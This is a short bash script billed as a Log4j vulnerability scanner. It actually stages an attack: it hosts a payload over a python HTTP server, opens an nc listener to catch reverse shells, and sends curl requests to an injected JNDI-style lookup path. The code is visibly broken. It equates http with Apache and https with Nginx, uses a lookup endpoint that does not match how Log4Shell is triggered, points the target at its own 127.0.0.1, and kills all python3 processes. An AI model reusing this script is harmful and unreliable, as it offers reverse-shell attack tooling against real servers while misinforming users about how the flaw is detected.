#!/bin/bash

echo "Vulnerability Scanner for Log4j"
echo "Checking if the server is vulnerable..."

read -p "Enter the URL of the website: " url

# Extract the server type and the server's IP address and port
if [[ "$url" == "http://"* ]]; then
    serverType="Apache"
    ipAddressAndPort=${url:7}
elif [[ "$url" == "https://"* ]]; then
    serverType="Nginx"
    ipAddressAndPort=${url:8}
else
    echo "Invalid URL. Please try again."
    exit 1
fi

echo "Server type: $serverType"
echo "IP address and port: $ipAddressAndPort"

# Start a simple HTTP server to host the payload file
python3 -m http.server 8888 > /dev/null 2>&1 &

# Detecting Log4j vulnerability
echo "Checking for Log4j vulnerability..."

# Setup a listener to catch reverse shells
nc -l -p 4444 > output.txt &

# Generate a payload file for Log4j vulnerability
echo "Greeting from Log4j!" > payload.txt

if [ "$serverType" == "Apache" ]; then
    curl "http://$ipAddressAndPort/jndi-manager/lookup?name=http://127.0.0.1:8888/payload.txt" > /dev/null 2>&1
else
    curl "https://$ipAddressAndPort/jndi-manager/lookup?name=http://127.0.0.1:8888/payload.txt" > /dev/null 2>&1
fi

# Wait for the reverse shell to establish
echo "Waiting for the reverse shell to establish..."
sleep 5

# Catch reverse shell output
output=$(cat output.txt)
echo "Reverse shell output: $output"

# Stop listener
echo "Stopping listener..."
killall nc

# Stop the HTTP server
killall python3
